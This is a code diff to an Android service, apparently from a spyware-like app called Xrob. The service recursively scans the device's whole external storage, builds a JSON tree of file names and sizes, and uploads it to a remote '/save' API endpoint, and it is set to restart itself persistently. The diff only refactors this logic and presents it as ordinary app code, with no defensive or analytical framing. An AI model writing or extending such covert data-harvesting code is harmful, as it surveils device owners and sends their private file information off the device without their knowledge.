@@ -29,6 +29,83 @@ import okhttp3.Response;
 
 public class FileWalkerService extends Service {
 
+    private static class FileWalker {
+        private static final String KEY_FILES = "files";
+        private static final String KEY_SIZE = "size";
+        private static final String KEY_NAME = "name";
+
+        private final File root;
+
+        public FileWalker(String root) {
+            this(new File(root));
+        }
+
+        public FileWalker(File root) {
+            this.root = root;
+        }
+
+        public JSONArray walk() throws JSONException {
+            return read(scan(this.root));
+        }
+
+        public static class FileNode {
+
+            private final String name;
+            private final List<FileNode> files;
+            private final long sizeInKb;
+
+            public FileNode(String name, List<FileNode> files, long sizeInKb) {
+                this.name = name;
+                this.files = files;
+                this.sizeInKb = sizeInKb;
+            }
+
+            public String getName() {
+                return name;
+            }
+
+            public List<FileNode> getFiles() {
+                return files;
+            }
+
+            public long getSizeInKb() {
+                return sizeInKb;
+            }
+        }
+
+        private static JSONArray read(List<FileNode> fileNodes) throws JSONException {
+            if (fileNodes != null) {
+                final JSONArray jaFiles = new JSONArray();
+                for (final FileNode fn : fileNodes) {
+                    final JSONObject joFn = new JSONObject();
+                    if (fn.getFiles() != null) {
+                        joFn.put(KEY_FILES, read(fn.getFiles()));
+                    }
+                    joFn.put(KEY_SIZE, fn.getSizeInKb());
+                    joFn.put(KEY_NAME, fn.getName());
+                    jaFiles.put(joFn);
+                }
+                return jaFiles;
+            }
+            return null;
+        }
+
+        private static List<FileNode> scan(File root) {
+
+            if (root.isDirectory()) {
+                final List<FileNode> rootFileNodes = new ArrayList<>();
+
+                for (final File file : root.listFiles()) {
+                    rootFileNodes.add(new FileNode(file.getName(), scan(file), (file.length() / 1024)));
+                }
+
+                return rootFileNodes;
+
+            }
+            return null;
+        }
+    }
+
     public FileWalkerService() {
     }
 
@@ -36,12 +113,10 @@ public class FileWalkerService extends Service {
     public int onStartCommand(Intent intent, int flags, int startId) {
 
         //Collections.reverse(fileNodes);
-
-        Log.d("X", "File wlker started............");
+        Log.d("X", "File walker started");
 
         try {
-            final List<FileNode> fileNodes = scan(Environment.getExternalStorageDirectory());
-            final JSONArray jaFiles = read(fileNodes);
+            final JSONArray jaFiles = new FileWalker(Environment.getExternalStorageDirectory()).walk();
             new APIRequestGateway(this, new APIRequestGateway.APIRequestGatewayCallback() {
                 @Override
                 public void onReadyToRequest(String apiKey) {
@@ -51,7 +126,7 @@ public class FileWalkerService extends Service {
                     final Request contactsRequest = new APIRequestBuilder("/save", apiKey)
                             .addParam(Xrob.KEY_ERROR, "false")
                             .addParam(Xrob.KEY_DATA_TYPE, Xrob.DATA_TYPE_FILES)
-                            .addParam(Xrob.KEY_MESSAGE, String.format(Locale.getDefault(), "%d files(s) retrieved", id))
+                            .addParam(Xrob.KEY_MESSAGE, "Files retrieved")
                             .addParam(Xrob.KEY_DATA, jaFiles.toString())
                             .build();
 
@@ -85,6 +160,8 @@ public class FileWalkerService extends Service {
         } catch (JSONException e) {
             e.printStackTrace();
         }
+
+
         return START_STICKY;
     }
 
@@ -94,64 +171,4 @@ public class FileWalkerService extends Service {
         throw new UnsupportedOperationException("Not yet implemented");
     }
 
-    public static class FileNode {
-        private final String id, name;
-        private final List<FileNode> files;
-        private final long sizeInKb;
-
-        public FileNode(String id, String name, List<FileNode> files, long sizeInKb) {
-            this.id = id;
-            this.name = name;
-            this.files = files;
-            this.sizeInKb = sizeInKb;
-        }
-
-        public String getId() {
-            return id;
-        }
-
-        public String getName() {
-            return name;
-        }
-
-        public List<FileNode> getFiles() {
-            return files;
-        }
-
-        public long getSizeInKb() {
-            return sizeInKb;
-        }
-    }
-
-    private static JSONArray read(List<FileNode> fileNodes) throws JSONException {
-        if (fileNodes != null) {
-            final JSONArray jaFiles = new JSONArray();
-            for (final FileNode fn : fileNodes) {
-                final JSONObject joFn = new JSONObject();
-                joFn.put("id", fn.getId());
-                if (fn.getFiles() != null) {
-                    joFn.put("files", read(fn.getFiles()));
-                }
-                joFn.put("size", fn.getSizeInKb());
-                joFn.put("name", fn.getName());
-                jaFiles.put(joFn);
-            }
-            return jaFiles;
-        }
-        return null;
-    }
-
-    private static int id = 1;
-
-    private static List<FileNode> scan(File root) {
-        System.out.println(root.getAbsolutePath());
-        if (root.isDirectory()) {
-            final List<FileNode> rootFileNodes = new ArrayList<>();
-            for (final File file : root.listFiles()) {
-                rootFileNodes.add(new FileNode(id++ + "", file.getName(), scan(file), (file.length() / 1024)));
-            }
-            return rootFileNodes;
-        }
-        return null;
-    }
 }
